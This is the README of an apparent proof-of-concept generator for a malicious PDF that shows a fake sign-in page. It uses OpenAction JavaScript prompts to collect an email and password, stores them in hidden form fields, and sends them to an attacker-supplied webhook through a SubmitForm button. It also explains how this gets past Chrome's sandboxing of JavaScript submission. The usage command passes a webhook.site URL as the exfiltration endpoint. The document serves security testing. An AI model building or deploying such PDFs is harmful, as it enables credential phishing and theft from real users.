# PDF-XSS PoC (credential theft via PDF form submission)

A minimal, reusable proof-of-concept showing stored XSS in a PDF viewer, where an uploaded PDF executes JavaScript, prompts for credentials, stores them in hidden form fields, and exfiltrates them via the PDF's native `SubmitForm` action.

The exfiltration works in Chrome (the native form-submission engine), not just desktop readers like Acrobat.

## How it works

1. The PDF renders as a normal "sign in to view document" page.
2. `/OpenAction /S /JavaScript` runs two `app.response` prompts (email, then password).
3. The values are written into two hidden AcroForm fields (`email`, `password`).
4. A "View document" button (a `SubmitForm` action) posts those field values to the webhook.

## Usage

```bash
python3 gen_pdf.py "https://webhook.site/your-id" poc.pdf
```

Open `poc.pdf`, type credentials into the two prompts, click "View document", and watch the webhook receive the FDF payload with `email` and `password`.

## Files

- `gen_pdf.py` — the generator (takes the webhook URL as the first argument).
- `pdf-xss-poc.pdf` — a pre-built example with a placeholder webhook.

## Notes

- The submit requires a click; Chrome's PDFium does not fire `SubmitForm` on open or on hover, only on the button click.
- JavaScript `submitForm()` / `launchURL()` are sandboxed and blocked in Chrome, but the `SubmitForm` button action is handled by the native form engine and does fire.
- For authorized testing only.
